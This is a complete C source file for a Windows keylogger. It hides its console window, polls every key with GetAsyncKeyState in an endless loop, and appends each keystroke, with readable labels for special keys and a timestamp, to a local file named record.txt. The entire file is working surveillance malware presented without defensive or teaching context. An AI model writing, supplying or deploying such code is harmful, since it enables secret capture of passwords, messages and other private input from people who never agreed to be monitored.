#include <stdio.h>
#include <windows.h>
#include <time.h>

#define LOG_FILE "record.txt"

void write(int);
const char *mapper(int);

int main()
{
    FreeConsole(); // detach the process from console

    FILE *file = fopen(LOG_FILE, "a+");
    time_t t = time(NULL);
    fprintf(file, "\n%s\t", ctime(&t));
    fclose(file);

    char i;
    while (1)
    { // infinite loop

        for (i = 8; i <= 255; i++) // scans for 8-255 ASCII chars
        {
            if (GetAsyncKeyState(i) == -32767)
            {
                write(i);
            }
        }

        // this 1ms sleep inhibits the program from occupying full processor
        Sleep(1);
    }

    return 0;
}

void write(int key)
{
    FILE *f;
    f = fopen(LOG_FILE, "a+");
    const char *res = mapper(key);
    printf("%s", res);
    if (strlen(res) == 0)
        fprintf(f, "%s", &key);
    else
        fprintf(f, "%s", res);
    fclose(f);
}

const char *mapper(int key)
{
    switch (key)
    {
    case 1:
        return "[LCLICK]\0";
    case 2:
        return "[RCLICK]";
    case 0x08:
        return "[BCKSPCE]";
    case 0x09:
        return "[TAB]";
    case 0x0c:
        return "[CLR]";
    case 0x0d:
        return "[ENTER]";
    case 0x10:
        return "[SHIFT]";
    case 0x11:
        return "[CTRL]";
    case 0x12:
        return "[ALT]";
    case 0x13:
        return "[PAUSE]";
    case 0x14:
        return "[CAPS]";
    case 0x1b:
        return "[ESC]";
    case 0x21:
        return "[PGUP]";
    case 0x22:
        return "[PGDN]";
    case 0x23:
        return "[END]";
    case 0x24:
        return "[HOME]";
    case 0x25:
        return "[LEFT]";
    case 0x26:
        return "[UP]";
    case 0x27:
        return "[RIGHT]";
    case 0x28:
        return "[DOWN]";
    case 0x2C:
        return "[PRTSC]";
    case 0x2D:
        return "[INS]";
    case 0x2E:
        return "[DEL]";
    case 0x5B:
        return "[WINKEY]";
    case 0x6A:
        return "*";
    case 0x6B:
        return "+";
    case 0x6D:
        return "-";
    case 0x6E:
        return ".";
    case 0x6F:
        return "/";
    case 0x70:
        return "[F1]";
    case 0x71:
        return "[F2]";
    case 0x72:
        return "[F3]";
    case 0x73:
        return "[F4]";
    case 0x74:
        return "[F5]";
    case 0x75:
        return "[F6]";
    case 0x76:
        return "[F7]";
    case 0x77:
        return "[F8]";
    case 0x78:
        return "[F9]";
    case 0x79:
        return "[F10]";
    case 0x7A:
        return "[F11]";
    case 0x7B:
        return "[F12]";
    case 0x90:
        return "[NUMLK]";
    case 0xA0:
        return "[LSHFT]";
    case 0xA1:
        return "[RSHFT]";
    case 0xA2:
        return "[LCTRL]";
    case 0xA3:
        return "[RCTRL]";
    case 0xA4:
        return "[LALT]";
    case 0xA5:
        return "[RALT]";
    default:
        return "";
        break;
    }
}
